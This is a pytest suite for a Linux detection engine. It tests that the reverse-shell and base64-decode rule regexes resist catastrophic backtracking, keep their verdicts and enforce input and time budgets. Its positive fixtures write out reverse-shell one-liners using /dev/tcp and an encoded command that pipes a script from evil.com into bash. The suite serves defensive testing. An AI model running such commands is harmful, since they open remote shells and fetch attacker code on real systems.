"""Adversarial regex safety tests for the shipped Linux rules (S3).

LNX-002 and LNX-005 regexes were rewritten to remove practical CPU denial
of service: nested unbounded groups became bounded spans, and LNX-005
branch 2 uses a tempered scan that stops at the first "base64". These
tests pin three properties:

1. Hostile command lines (the audit's adversarial families, repeated to
   the 16 KiB input budget) finish quickly.
2. Detection verdicts on fixture and probe commands are unchanged.
3. The engine enforces matching budgets with observable rejection.
"""
import logging
import time
from datetime import datetime

import pytest

from collectors.base import Event
from core.engine import DetectionEngine
from core.rule_loader import Rule, RuleLoader

_TIMESTAMP = datetime(2026, 10, 15, 12, 0, 0)

# Hostile families adapted from audit/research-scratch/lead/redos_probe.py,
# sized to stay within the engine input budget (16 KiB) so the regexes
# themselves are exercised.
HOSTILE_COMMANDS = {
    "LNX-002": [
        "sh>" * 5000,
        "sh<" * 5000,
        "sh" + ">" * 14997,
        " sh>" * 3750,
        "exec " * 3000,
        "/bin/sh " * 1875,
        "bash " * 3000,
        "nc><" * 3750,
    ],
    "LNX-005": [
        "echo base64|" * 1250,
        "base64 -d " * 1500,
        "echo " * 3000,
        "base64|" * 2142,
        "base64 -d|" * 1500,
    ],
}

# Commands whose verdicts must not change with the rewrite. The two
# fixture commands are the exact command lines the Linux collector
# produces for tests/fixtures/linux/{reverse_shell,base64_decode}.log.
PARITY_POSITIVES = {
    "LNX-002": [
        "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "bash -c bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        "/bin/bash -c 'exec 5<>/dev/tcp/host/4444' 0<&1",
        "exec 3<>/dev/tcp/1.2.3.4/80",
    ],
    "LNX-005": [
        "bash -c echo IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo | base64 -d | bash",
        "echo cGF5bG9hZA== | base64 -d | sh",
        "echo " + "A" * 300 + " | base64 --decode | sh",
    ],
}
PARITY_NEGATIVES = {
    "LNX-002": [
        "rsync -a /srv/ /mnt/backup/ > /var/log/rsync-dev.log",
        "echo hello world",
        "sh -c 'run backup.sh' > /tmp/out.log 2>&1",
    ],
    "LNX-005": [
        "echo base64 | cat",
        "base64 file.txt",
        "echo hello world",
    ],
}


def _linux_event(command_line: str, user: str = "www-data") -> Event:
    return Event(
        timestamp=_TIMESTAMP,
        platform="linux",
        process_name="bash",
        command_line=command_line,
        user=user,
        process_id=1234,
    )


@pytest.fixture(scope="module")
def shipped_rules():
    """Load the two hardened rules from the shipped rule files."""
    loader = RuleLoader()
    return {
        "LNX-002": loader.load_rule_file("rules/linux/reverse_shell.yml"),
        "LNX-005": loader.load_rule_file("rules/linux/base64_decode.yml"),
    }


class TestAdversarialRegexTiming:
    """Hostile inputs stay fast; the time budget never trips for them."""

    @pytest.mark.parametrize("rule_id", ["LNX-002", "LNX-005"])
    def test_hostile_commands_within_budget(self, shipped_rules, rule_id):
        engine = DetectionEngine([shipped_rules[rule_id]])
        worst = 0.0
        for command in HOSTILE_COMMANDS[rule_id]:
            started = time.perf_counter()
            engine.match_event(_linux_event(command))
            elapsed = time.perf_counter() - started
            worst = max(worst, elapsed)
            assert elapsed < 1.0, (
                f"{rule_id} took {elapsed:.3f}s on a {len(command)} char "
                f"hostile command"
            )
        # No search may have needed the time budget guard.
        assert engine.regex_rejection_counts() == {}
        print(f"{rule_id}: worst hostile match {worst * 1000:.2f} ms")


class TestDetectionParity:
    """Rewrite keeps the detection verdicts on fixtures and probes."""

    @pytest.mark.parametrize("rule_id", ["LNX-002", "LNX-005"])
    def test_positives_still_match(self, shipped_rules, rule_id):
        engine = DetectionEngine([shipped_rules[rule_id]])
        for command in PARITY_POSITIVES[rule_id]:
            alerts = engine.match_event(_linux_event(command))
            assert [alert.rule_id for alert in alerts] == [rule_id], (
                f"{rule_id} lost a true positive: {command!r}"
            )

    @pytest.mark.parametrize("rule_id", ["LNX-002", "LNX-005"])
    def test_negatives_still_do_not_match(self, shipped_rules, rule_id):
        engine = DetectionEngine([shipped_rules[rule_id]])
        for command in PARITY_NEGATIVES[rule_id]:
            alerts = engine.match_event(_linux_event(command))
            assert alerts == [], (
                f"{rule_id} matches a negative: {command!r}"
            )


class TestMatchingBudgets:
    """Budgets reject observably instead of degrading silently."""

    def test_oversized_command_is_rejected_and_counted(self, shipped_rules):
        engine = DetectionEngine(
            [shipped_rules["LNX-002"]], max_regex_input_chars=1024
        )
        command = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" + " " + "A" * 2000
        assert engine.match_event(_linux_event(command)) == []
        assert engine.regex_rejection_counts() == {
            "LNX-002:input_size_exceeded": 1
        }

    def test_time_budget_rejection_is_observable(self, shipped_rules):
        # A negative budget forces the rejection path deterministically.
        engine = DetectionEngine(
            [shipped_rules["LNX-002"]], regex_time_budget_seconds=-1.0
        )
        command = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
        assert engine.match_event(_linux_event(command)) == []
        assert engine.regex_rejection_counts() == {
            "LNX-002:time_budget_exceeded": 1
        }

    def test_rejection_logs_one_warning_per_reason(self, shipped_rules, caplog):
        engine = DetectionEngine(
            [shipped_rules["LNX-002"]], max_regex_input_chars=64
        )
        oversized = "bash " + "A" * 500
        with caplog.at_level(logging.WARNING, logger="core.engine"):
            engine.match_event(_linux_event(oversized))
            engine.match_event(_linux_event("sh " + "A" * 500))
        warnings = [
            record
            for record in caplog.records
            if "budget rejection" in record.getMessage()
        ]
        assert len(warnings) == 1
        assert engine.regex_rejection_counts() == {
            "LNX-002:input_size_exceeded": 2
        }

    def test_normal_matches_do_not_trip_budgets(self, shipped_rules):
        engine = DetectionEngine(list(shipped_rules.values()))
        command = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
        alerts = engine.match_event(_linux_event(command))
        assert [alert.rule_id for alert in alerts] == ["LNX-002"]
        assert engine.regex_rejection_counts() == {}

    def test_user_pattern_respects_budget(self):
        rule = Rule(
            {
                "name": "Admin user rule",
                "id": "LNX-900",
                "platform": "linux",
                "severity": "low",
                "detection": {"user_pattern": "^root"},
            }
        )
        engine = DetectionEngine([rule], max_regex_input_chars=16)
        oversized_user = "root" + "x" * 100
        assert engine.match_event(_linux_event("ls", user=oversized_user)) == []
        assert engine.regex_rejection_counts() == {
            "LNX-900:input_size_exceeded": 1
        }
        normal = engine.match_event(_linux_event("ls", user="root"))
        assert [alert.rule_id for alert in normal] == ["LNX-900"]
